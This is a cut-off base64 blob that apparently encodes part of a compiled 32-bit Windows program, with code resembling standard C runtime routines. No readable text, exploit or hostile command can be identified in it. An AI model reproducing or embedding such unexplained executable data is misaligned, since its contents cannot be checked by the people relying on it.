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txf//gyAA6LjF///HAAkAAADo8MT//4PI/13Di/9Vi+xWi3UIhfYPhOoAAACLRgw7BTTnQQB0B1Do9sX//1mLRhA7BTjnQQB0B1Do5MX//1mLRhQ7BTznQQB0B1Do0sX//1mLRhg7BUDnQQB0B1DowMX//1mLRhw7BUTnQQB0B1DorsX//1mLRiA7BUjnQQB0B1DonMX//1mLRiQ7BUznQQB0B1DoisX//1mLRjg7BWDnQQB0B1DoeMX//1mLRjw7BWTnQQB0B1DoZsX//1mLRkA7BWjnQQB0B1DoVMX//1mLRkQ7BWznQQB0B1DoQsX//1mLRkg7BXDnQQB0B1DoMMX//1mLRkw7BXTnQQB0B1DoHsX//1leXcOL/1WL7FaLdQiF9nRZiwY7BSjnQQB0B1Do/cT//1mLRgQ7BSznQQB0B1Do68T//1mLRgg7BTDnQQB0B1Do2cT//1mLRjA7BVjnQQB0B1Dox8T//1mLRjQ7BVznQQB0B1DotcT//1leXcOL/1WL7ItNDFNWi3UIVzP/jQSOgeH///8/O8Yb2/fTI9l0EP826IfE//9HjXYEWTv7dfBfXltdw4v/VYvsVot1CIX2D4TQAAAAagdW6K////+NRhxqB1DopP///41GOGoMUOiZ////jUZoagxQ6I7///+NhpgAAABqAlDogP////+2oAAAAOgmxP///7akAAAA6BvE////tqgAAADoEMT//42GtAAAAGoHUOhR////jYbQAAAAagdQ6EP///+DxESNhuwAAABqDFDoMv///42GHAEAAGoMUOgk////jYZMAQAAagJQ6Bb/////tlQBAADovMP///+2WAEAAOixw////7ZcAQAA6KbD////tmABAADom8P//4PEKF5dw4v/VYvsUeiH1///i0hMiU38jU38UVDoydn//4tF/FlZiwDJw4v/VYvsi00IM8BTVldmOQF0MYtVDA+3OovyZoX/dBwPtwGL32Y72HQhg8YCD7cGi9hmhcAPtwF16zPAg8ECZjkBddUzwF9eW13Di8Hr94v/VYvsg+wcoQTgQQAzxYlF/FNWV/91CI1N5OgDg///i10chdt1BotF6ItYCDPAM/85RSBXV/91FA+VwP91EI0ExQEAAABQU+ie9f//g8QYiUX0hcAPhIQAAACNFACNSgiJVfg70RvAI8F0NT0ABAAAdxPoz3MAAIv0hfZ0HscGzMwAAOsTUOjyzP//i/BZhfZ0CccG3d0AAIPGCItV+OsCi/eF9nQxUldW6FhS////dfRW/3UU/3UQagFT6Cr1//+DxCSFwHQQ/3UYUFb/dQz/FahgQQCL+FboJQAAAFmAffAAdAqLReSDoFADAAD9i8eNZdhfXluLTfwzzejmQv//ycOL/1WL7ItFCIXAdBKD6AiBON3dAAB1B1DoA8L//1ldw4v/VYvsi0UI8P9ADItIfIXJdAPw/wGLiIQAAACFyXQD8P8Bi4iAAAAAhcl0A/D/AYuIjAAAAIXJdAPw/wFWagaNSChegXn4+OFBAHQJixGF0nQD8P8Cg3n0AHQKi1H8hdJ0A/D/AoPBEIPuAXXW/7CcAAAA6EwBAABZXl3Di/9Vi+xRU1aLdQhXi4aIAAAAhcB0bD0o50EAdGWLRnyFwHRegzgAdVmLhoQAAACFwHQYgzgAdRNQ6EXB////togAAADoIvv//1lZi4aAAAAAhcB0GIM4AHUTUOgjwf///7aIAAAA6P77//9ZWf92fOgOwf///7aIAAAA6APB//9ZWYuGjAAAAIXAdEWDOAB1QIuGkAAAAC3+AAAAUOjhwP//i4aUAAAAv4AAAAArx1DozsD//4uGmAAAACvHUOjAwP///7aMAAAA6LXA//+DxBD/tpwAAADolQAAAFlqBliNnqAAAACJRfyNfiiBf/j44UEAdB2LB4XAdBSDOAB1D1DofcD///8z6HbA//9ZWYtF/IN/9AB0FotH/IXAdAyDOAB1B1DoWcD//1mLRfyDwwSDxxCD6AGJRfx1sFboQcD//1lfXlvJw4v/VYvsi00Ihcl0FoH56HVBAHQOM8BA8A/BgbAAAABAXcO4////f13Di/9Vi+xWi3UIhfZ0IYH+6HVBAHQZi4awAAAAkIXAdQ5W6HP7//9W6Oa///9ZWV5dw4v/VYvsi00Ihcl0FoH56HVBAHQOg8j/8A/BgbAAAABIXcO4////f13Di/9Vi+yLRQiFwHRz8P9IDItIfIXJdAPw/wmLiIQAAACFyXQD8P8Ji4iAAAAAhcl0A/D/CYuIjAAAAIXJdAPw/wlWagaNSChegXn4+OFBAHQJixGF0nQD8P8Kg3n0AHQKi1H8hdJ0A/D/CoPBEIPuAXXW/7CcAAAA6Fr///9ZXl3DagxoaMpBAOj/SP//g2XkAOgf0///iw2A50EAjXhMhYhQAwAAdAaLN4X2dT1qBOibu///WYNl/AD/NeDzQQBX6D0AAABZWYvwiXXkx0X8/v///+gJAAAAhfZ0IOsMi3XkagTor7v//1nDi8aLTfBkiQ0AAAAAWV9eW8nD6P6w///Mi/9Vi+xWi3UMV4X2dDyLRQiFwHQ1izg7/nUEi8brLVaJMOiP/P//WYX/dO9X6Mz+//+DfwwAWXXigf844UEAdNpX6Oz8//9Z69EzwF9eXcOL/1WL7FaLdQyF9nQbauAz0lj39jtFEHMP6Ni9///HAAwAAAAzwOtCU4tdCFeF23QLU+jhQAAAWYv46wIz/w+vdRBWU+gCQQAAi9hZWYXbdBU7/nMRK/eNBDtWagBQ6OdN//+DxAxfi8NbXl3D/xWcYEEAhcCjBPRBAA+VwMODJQT0QQAAsAHDi/9Vi+xTVleLfQg7fQx0UYv3ix6F23QOi8v/FahhQQD/04TAdAiDxgg7dQx15Dt1DHQuO/d0JoPG/IN+/AB0E4sehdt0DWoAi8v/FahhQQD/01mD7giNRgQ7x3XdMsDrArABX15bXcOL/1WL7FaLdQw5dQh0HleLfvyF/3QNagCLz/8VqGFBAP/XWYPuCDt1CHXkX7ABXl3Di/9Vi+yLRQijCPRBAF3Di/9Vi+xW6CIAAACL8IX2dBf/dQiLzv8VqGFBAP/WWYXAdAUzwEDrAjPAXl3DagxoiMpBAOjRRv//g2XkAGoA6Im5//9Zg2X8AIs1BOBBAIvOg+EfMzUI9EEA086JdeTHRfz+////6BUAAACLxotN8GSJDQAAAABZX15bycOLdeRqAOiOuf//WcNqDGjIykEA6HVG//+DZeQAi0UI/zDoKrn//1mDZfwAizUE4EEAi86D4R8zNRT0QQDTzol15MdF/P7////oFwAAAIvGi03wZIkNAAAAAFlfXlvJwgwAi3Xki00Q/zHoKrn//1nDi/9Vi+yLRQhIg+gBdC2D6AR0IYPoCXQVg+gGdAmD6AF0EjPAXcO4EPRBAF3DuBj0QQBdw7gU9EEAXcO4DPRBAF3Di/9Vi+xrDShuQQAMi0UMA8g7wXQPi1UIOVAEdAmDwAw7wXX0M8Bdw4v/VYvsg+wMagNYiUX4jU3/iUX0jUX4UI1F/1CNRfRQ6A3////Jw4v/VYvsi0UIowz0QQCjEPRBAKMU9EEAoxj0QQBdw+iSz///g8AIw2ooaKjKQQDoWUX//zPbiV3YIV3MsQGITeeLdQhqCF87938YdDWNRv+D6AF0IkiD6AF0J0iD6AF1ResUg/4LdBqD/g90CoP+FH40g/4Wfy9W6PP+//+DxATrPuiG0P//i9iJXdiF23UIg8j/6WcBAAD/M1boEv///1lZhcB1Euieuv//xwAWAAAA6Na5///r2IPACDLJiE3niUXcg2XQAITJdAtqA+h+t///WYpN54Nl1ADGReYAg2X8AItF3ITJdBSLFQTgQQCLyoPhHzMQ08qKTefrAosQiVXgiVXUg/oBD5TAiEXmhMB1bIXSD4T1AAAAO/d0CoP+C3QFg/4EdSaLQwSJRdCDYwQAO/d1Pujk/v//iwCJRczo2v7//8cAjAAAAItV4Dv3dSJrBSxuQQAMAwNrDTBuQQAMA8iJRcg7wXQTg2AIAIPADOvwoQTgQQCLTdyJAcdF/P7////oMQAAAIB95gB1bTv3dTnoHc7///9wCFeLTeD/FahhQQD/VeBZ6y1qCF+LdQiLXdiLVdSJVeCAfecAdAtqA+jQtv//WYtV4MNWi8r/FahhQQD/VeBZO/d0CoP+C3QFg/4EdRWLRdCJQwQ793UL6L/N//+LTcyJSAgzwItN8GSJDQAAAABZX15bycOEyXQIagPofrb//1lqA+jOcf//zIv/VYvsi00Ii8FTg+AQuwACAABWweADV/bBCHQCC8P2wQR0BQ0ABAAA9sECdAUNAAgAAPbBAXQFDQAQAAC+AAEAAPfBAAAIAHQCC8aL0b8AAwAAI9d0HzvWdBY703QLO9d1Ew0AYAAA6wwNAEAAAOsFDQAgAAC6AAAAA18jyl5bgfkAAAABdBiB+QAAAAJ0CzvKdRENAIAAAF3Dg8hAXcMNQIAAAF3Di/9Vi+yD7AxW3X382+Iz9kY5NWzsQQAPjIIAAABmi0X8M8mL0Ve/AAAIAKg/dCkPt9Aj1sHiBKgEdAODygioCHQDg8oEqBB0A4PKAqggdAIL1qgCdAIL1w+uXfiLRfiD4MCJRfQPrlX0i0X4qD90KIvII87B4QSoBHQDg8kIqAh0A4PJBKgQdAODyQKoIHQCC86oAnQCC88LyovBX+s8ZotN/DPA9sE/dDEPt8EjxsHgBPbBBHQDg8gI9sEIdAODyAT2wRB0A4PIAvbBIHQCC8b2wQJ0BQ0AAAgAXsnDi/9Vi+yD7BCb2X34ZotF+A+3yIPhAcHhBKgEdAODyQioCHQDg8kEqBB0A4PJAqggdAODyQGoAnQGgckAAAgAU1YPt/C7AAwAAIvWV78AAgAAI9N0JoH6AAQAAHQYgfoACAAAdAw703USgckAAwAA6woLz+sGgckAAQAAgeYAAwAAdAw793UOgckAAAEA6waByQAAAgAPt8C6ABAAAIXCdAaByQAABACLfQyL94tFCPfWI/EjxwvwO/EPhKgAAABW6DwCAABZZolF/Nlt/JvZffxmi0X8D7fwg+YBweYEqAR0A4POCKgIdAODzgSoEHQDg84CqCB0A4POAagCdAaBzgAACAAPt9CLyiPLdCqB+QAEAAB0HIH5AAgAAHQMO8t1FoHOAAMAAOsOgc4AAgAA6waBzgABAACB4gADAAB0EIH6AAIAAHUOgc4AAAEA6waBzgAAAgAPt8C6ABAAAIXCdAaBzgAABACDPWzsQQABD4yGAQAAgecfAwgDD65d8ItN8IvBwegDg+AQ98EAAgAAdAODyAj3wQAEAAB0A4PIBPfBAAgAAHQDg8gChcp0A4PIAffBAAEAAHQFDQAACACL0bsAYAAAI9N0J4H6ACAAAHQagfoAQAAAdAs703UTDQADAADrDA0AAgAA6wUNAAEAAGpAgeFAgAAAWyvLdBqB6cB/AAB0CyvLdRMNAAAAAesMDQAAAAPrBQ0AAAACi88jfQj30SPIC887yA+EtAAAAFHoRvz//1CJRfToITkAAFlZD65d9ItN9IvBwegDg+AQ98EAAgAAdAODyAj3wQAEAAB0A4PIBPfBAAgAAHQDg8gC98EAEAAAdAODyAH3wQABAAB0BQ0AAAgAi9G/AGAAACPXdCeB+gAgAAB0GoH6AEAAAHQLO9d1Ew0AAwAA6wwNAAIAAOsFDQABAACB4UCAAAAry3QagenAfwAAdAsry3UTDQAAAAHrDA0AAAAD6wUNAAAAAovIM8YLzqkfAwgAdAaByQAAAICLwesCi8ZfXlvJw4v/VYvsi00Ii9HB6gSD4gGLwvbBCHQGg8oED7fC9sEEdAODyAj2wQJ0A4PIEPbBAXQDg8gg98EAAAgAdAODyAJWi9G+AAMAAFe/AAIAACPWdCOB+gABAAB0FjvXdAs71nUTDQAMAADrDA0ACAAA6wUNAAQAAIvRgeIAAAMAdAyB+gAAAQB1BgvH6wILxl9e98EAAAQAdAUNABAAAF3Di/9Vi+xRUWaLRQi5//8AAFZmi3UMD7fWZjvBdEe5AAEAAGY7wXMQD7fIoSDnQQAPtwRII8LrL2aJRfgzwGaJRfyNRfxQagGNRfhQagHokjgAAIPEEIXAdAsPt0X8D7fOI8HrAjPAXsnDi/9Vi+yD7CChBOBBADPFiUX8/3UQjU3g6Oxz//+LVQiD+v98E4H6/wAAAH8Li0XkiwAPtwRQ63RTVot15IvawfsID7bLV4sGM/9mOTxIfRAzyYhd8GoCiFXxiE3yWOsLM8mIVfAzwIhN8UBqAYlN9GaJTfiNTfT/dghRUI1F8FCNReRqAVDoW/D//4PEH